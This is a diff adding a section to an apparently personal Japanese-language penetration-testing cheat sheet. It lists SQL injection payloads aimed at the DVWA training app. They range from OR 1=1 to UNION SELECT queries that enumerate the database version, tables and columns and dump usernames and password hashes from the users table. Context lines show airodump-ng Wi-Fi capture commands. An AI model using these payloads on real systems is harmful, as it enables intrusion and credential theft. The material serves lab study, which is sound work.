@@ -533,3 +533,35 @@ iw [インターフェース名] link
 # 解析に必要な情報を調べる
 sudo airodump-ng --channel [CH] --bssid [BSSID] --write [生成ファイルの接頭辞] [インターフェース名]
 ```
+
+## DVWA
+
+```txt
+# 一覧表示
+1' OR 1=1 #
+1' OR 1=1 -- 
+
+# DBバージョン表示
+' UNION SELECT version(), null #
+# ホスト名、DB名
+' UNION SELECT @@hostname, null #
+# DB名
+' UNION SELECT database(), null #
+# ユーザ名
+' UNION SELECT user(), null #
+
+# テーブル名一覧
+' UNION SELECT table_name, null FROM information_schema.tables #
+# dvwa DBのテーブル一覧
+' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'dvwa' #
+# カラム名取得
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' #
+# パスワード取得
+' UNION SELECT user, password FROM dvwa.users #
+```
+
+### findmyhash
+
+```bash
+
+```
